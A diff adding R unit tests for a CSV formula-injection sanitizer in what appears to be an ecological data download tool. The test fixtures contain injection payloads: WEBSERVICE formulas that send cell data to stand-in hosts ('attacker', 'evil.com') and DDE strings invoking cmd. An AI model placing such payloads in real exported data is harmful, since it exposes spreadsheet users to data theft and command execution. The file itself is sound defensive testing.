@@ -389,3 +389,207 @@ test_that("create_download_readme handles single main table", {
   expect_false(grepl("Example \\(R\\)", readme))
 })
 
+# CSV INJECTION PREVENTION TESTS =================================================================
+
+test_that("sanitize_csv_injection prefixes formula characters with tab", {
+  df <- data.frame(
+    safe = c("Normal text", "Another value"),
+    formula_equals = c("=1+1", "safe"),
+    formula_plus = c("+1", "safe"),
+    formula_minus = c("-1", "safe"),
+    formula_at = c("@SUM(A1)", "safe"),
+    formula_pipe = c("|command", "safe"),
+    formula_percent = c("%macro", "safe"),
+    stringsAsFactors = FALSE
+  )
+
+  result <- sanitize_csv_injection(df)
+
+  # Safe values should be unchanged
+  expect_equal(result$safe, df$safe)
+
+  # Formula characters should be prefixed with tab
+  expect_equal(result$formula_equals[1], "\t=1+1")
+  expect_equal(result$formula_equals[2], "safe")
+
+  expect_equal(result$formula_plus[1], "\t+1")
+  expect_equal(result$formula_plus[2], "safe")
+
+  expect_equal(result$formula_minus[1], "\t-1")
+  expect_equal(result$formula_minus[2], "safe")
+
+  expect_equal(result$formula_at[1], "\t@SUM(A1)")
+  expect_equal(result$formula_at[2], "safe")
+
+  expect_equal(result$formula_pipe[1], "\t|command")
+  expect_equal(result$formula_pipe[2], "safe")
+
+  expect_equal(result$formula_percent[1], "\t%macro")
+  expect_equal(result$formula_percent[2], "safe")
+})
+
+test_that("sanitize_csv_injection handles realistic attack vectors", {
+  df <- data.frame(
+    location = c("California", "Texas"),
+    notes = c(
+      "=WEBSERVICE(\"https://attacker/?x=\"&A1)",
+      "Normal observation notes"
+    ),
+    author = c("Dr. Smith", "@cmd|'/c calc'!A1"),
+    project_name = c("+1-1+cmd|'/c calc'!A1", "Grassland Survey"),
+    stringsAsFactors = FALSE
+  )
+
+  result <- sanitize_csv_injection(df)
+
+  # Check that dangerous formulas are neutralized
+  expect_true(startsWith(result$notes[1], "\t"))
+  expect_equal(result$notes[2], "Normal observation notes")
+
+  expect_true(startsWith(result$author[2], "\t"))
+  expect_equal(result$author[1], "Dr. Smith")
+
+  expect_true(startsWith(result$project_name[1], "\t"))
+  expect_equal(result$project_name[2], "Grassland Survey")
+})
+
+test_that("sanitize_csv_injection only processes character columns", {
+  df <- data.frame(
+    text = c("=formula", "safe"),
+    numeric = c(1, 2),
+    logical = c(TRUE, FALSE),
+    factor_col = factor(c("=level1", "level2")),
+    stringsAsFactors = FALSE
+  )
+
+  result <- sanitize_csv_injection(df)
+
+  # Character column should be sanitized
+  expect_equal(result$text[1], "\t=formula")
+
+  # Numeric, logical, and factor columns should be unchanged
+  expect_equal(result$numeric, df$numeric)
+  expect_equal(result$logical, df$logical)
+  expect_equal(result$factor_col, df$factor_col)
+})
+
+test_that("sanitize_csv_injection handles NA values", {
+  df <- data.frame(
+    col1 = c("=formula", NA, "safe", NA),
+    col2 = c(NA, "+formula", NA, "safe"),
+    stringsAsFactors = FALSE
+  )
+
+  result <- sanitize_csv_injection(df)
+
+  expect_equal(result$col1[1], "\t=formula")
+  expect_true(is.na(result$col1[2]))
+  expect_equal(result$col1[3], "safe")
+  expect_true(is.na(result$col1[4]))
+
+  expect_true(is.na(result$col2[1]))
+  expect_equal(result$col2[2], "\t+formula")
+  expect_true(is.na(result$col2[3]))
+  expect_equal(result$col2[4], "safe")
+})
+
+test_that("sanitize_csv_injection handles empty data frames", {
+  df_empty <- data.frame()
+  result <- sanitize_csv_injection(df_empty)
+  expect_equal(nrow(result), 0)
+
+  df_no_rows <- data.frame(col1 = character(), col2 = character())
+  result <- sanitize_csv_injection(df_no_rows)
+  expect_equal(nrow(result), 0)
+  expect_equal(names(result), c("col1", "col2"))
+})
+
+test_that("sanitize_csv_injection handles NULL input", {
+  result <- sanitize_csv_injection(NULL)
+  expect_null(result)
+})
+
+test_that("sanitize_csv_injection preserves data frame structure", {
+  df <- data.frame(
+    a = c("=test", "safe"),
+    b = c(1, 2),
+    c = c("normal", "+danger"),
+    stringsAsFactors = FALSE
+  )
+
+  result <- sanitize_csv_injection(df)
+
+  expect_equal(nrow(result), nrow(df))
+  expect_equal(ncol(result), ncol(df))
+  expect_equal(names(result), names(df))
+  expect_equal(class(result), class(df))
+})
+
+test_that("sanitize_csv_injection handles formulas mid-string", {
+  df <- data.frame(
+    text = c("This is =formula", "=start formula", "safe text =middle"),
+    stringsAsFactors = FALSE
+  )
+
+  result <- sanitize_csv_injection(df)
+
+  # Only formulas at the START of string should be sanitized
+  expect_equal(result$text[1], "This is =formula") # Not at start
+  expect_equal(result$text[2], "\t=start formula") # At start
+  expect_equal(result$text[3], "safe text =middle") # Not at start
+})
+
+test_that("sanitize_csv_injection handles whitespace edge cases", {
+  df <- data.frame(
+    text = c(" =formula", "=formula ", " safe", ""),
+    stringsAsFactors = FALSE
+  )
+
+  result <- sanitize_csv_injection(df)
+
+  # Space before = means it's not at start, should NOT be sanitized
+  expect_equal(result$text[1], " =formula")
+  # = at start with trailing space, SHOULD be sanitized
+  expect_equal(result$text[2], "\t=formula ")
+  # Normal space at start, should NOT be sanitized
+  expect_equal(result$text[3], " safe")
+  # Empty string should remain empty
+  expect_equal(result$text[4], "")
+})
+
+test_that("create_download_zip sanitizes all tables", {
+  config <- TABLE_DOWNLOAD_CONFIG$plot_table
+  filter_state <- list(search = NULL, filter = NULL)
+
+  csv_tables <- list(
+    main = data.frame(
+      ob_code = "ob.1",
+      notes = "=WEBSERVICE(\"https://evil.com\")",
+      stringsAsFactors = FALSE
+    ),
+    taxon_observations = data.frame(
+      ob_code = "ob.1",
+      name = "+cmd|'/c calc'!A1",
+      stringsAsFactors = FALSE
+    )
+  )
+
+  zip_path <- create_download_zip(csv_tables, config, filter_state)
+
+  expect_true(file.exists(zip_path))
+
+  # Extract and verify sanitization
+  temp_extract <- tempfile()
+  dir.create(temp_extract)
+  on.exit(unlink(temp_extract, recursive = TRUE), add = TRUE)
+
+  zip::unzip(zip_path, exdir = temp_extract)
+
+  # Read back the main CSV and check sanitization
+  main_csv <- read.csv(file.path(temp_extract, "main.csv"), stringsAsFactors = FALSE)
+  expect_true(startsWith(main_csv$notes[1], "\t"))
+
+  # Read back the nested CSV and check sanitization
+  taxa_csv <- read.csv(file.path(temp_extract, "taxon_observations.csv"), stringsAsFactors = FALSE)
+  expect_true(startsWith(taxa_csv$name[1], "\t"))
+})
